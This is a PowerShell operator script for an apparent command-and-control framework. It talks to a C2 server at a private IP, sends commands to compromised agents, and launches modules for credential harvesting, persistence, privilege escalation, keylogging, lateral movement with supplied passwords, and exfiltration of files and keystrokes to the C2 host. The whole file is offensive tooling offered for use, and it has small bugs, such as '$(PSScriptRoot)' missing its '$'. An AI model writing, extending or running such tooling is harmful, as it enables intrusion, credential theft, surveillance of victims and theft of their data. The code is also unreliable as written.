# PowerShell CLI for interacting with the C2 server

param(
    [string]$Command,
    [string]$AgentID,
    [string]$FilePath,
    [string]$TargetIP,
    [string]$Username,
    [string]$Password
)

$C2_URL = "http://10.0.2.4:8080"

function List-Agents {
    $response = Invoke-RestMethod -Uri "$C2_URL/list_agents" -Method Get
    $response.agents | ForEach-Object { Write-Output $_.AgentID }
}

function Send-Command {
    param($AgentID, $Command)
    
    $payload = @{ "AgentID" = $AgentID; "Command" = $Command } | ConvertTo-Json -Compress
    Invoke-RestMethod -Uri "$C2_URL/sendcommand" -Method Post -Body $payload -ContentType "application/json"
    Start-Sleep -Seconds 30
    Fetch-Result -AgentID $AgentID
}

function Fetch-Result {
    param($AgentID)
    
    $response = Invoke-RestMethod -Uri "$C2_URL/result?agent_id=$AgentID" -Method Get
    Write-Output "Result from agent $AgentID: $($response.Result)"
}

function Harvest-Credentials {
    Write-Output "Harvesting credentials..."
    $scriptPath = "$(PSScriptRoot)\modules\windows\credential_harvesting.ps1"
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath" -NoNewWindow
}

function Establish-Persistence {
    Write-Output "Establishing persistence..."
    $scriptPath = "$(PSScriptRoot)\modules\windows\persistence.ps1"
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath" -NoNewWindow
}

function Escalate-Privileges {
    Write-Output "Attempting privilege escalation..."
    $scriptPath = "$(PSScriptRoot)\modules\windows\privilege_escalation.ps1"
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath" -NoNewWindow
}

function Gather-System-Info {
    param($AgentID)
    
    $scriptPath = "$(PSScriptRoot)\modules\windows\gather_system_info.ps1"
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath -C2Url $C2_URL/receive_system_info -AgentID $AgentID" -NoNewWindow
}

function Exfiltrate-Data {
    param($FilePath)
    
    Write-Output "Exfiltrating data: $FilePath"
    $scriptPath = "$(PSScriptRoot)\modules\windows\exfiltration.ps1"
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath -FilePath $FilePath -C2Url $C2_URL/exfiltrate" -NoNewWindow
}

function Start-Keylogger {
    param($AgentID)
    
    $scriptPath = "$(PSScriptRoot)\modules\windows\keylogging.ps1"
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath -C2Url $C2_URL/receive_keystrokes -AgentID $AgentID" -NoNewWindow
}

function Move-Laterally {
    param($TargetIP, $Username, $Password)
    
    Write-Output "Attempting lateral movement to $TargetIP"
    $scriptPath = "$(PSScriptRoot)\modules\windows\lateral_movement.ps1"
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath -TargetIP $TargetIP -Username $Username -Password $Password" -NoNewWindow
}

function Deploy-Payload {
    param($AgentType)
    
    $payloadDir = "$(PSScriptRoot)\..\payloads"
    
    switch ($AgentType) {
        "windows" { Start-Process -FilePath "powershell.exe" -ArgumentList "-File $payloadDir\windows_payload.ps1" -NoNewWindow }
        "macos" { Write-Output "MacOS payload execution not supported in PowerShell" }
        "linux" { Write-Output "Linux payload execution not supported in PowerShell" }
        default { Write-Output "Unknown agent type." }
    }
}

switch ($Command) {
    "list-agents" { List-Agents }
    "send-command" { Send-Command -AgentID $AgentID -Command $FilePath }
    "harvest-credentials" { Harvest-Credentials }
    "establish-persistence" { Establish-Persistence }
    "escalate-privileges" { Escalate-Privileges }
    "gather-system-info" { Gather-System-Info -AgentID $AgentID }
    "exfiltrate-data" { Exfiltrate-Data -FilePath $FilePath }
    "start-keylogger" { Start-Keylogger -AgentID $AgentID }
    "move-laterally" { Move-Laterally -TargetIP $TargetIP -Username $Username -Password $Password }
    "deploy-payload" { Deploy-Payload -AgentType $AgentID }
    default { Write-Output "Unknown command" }
}





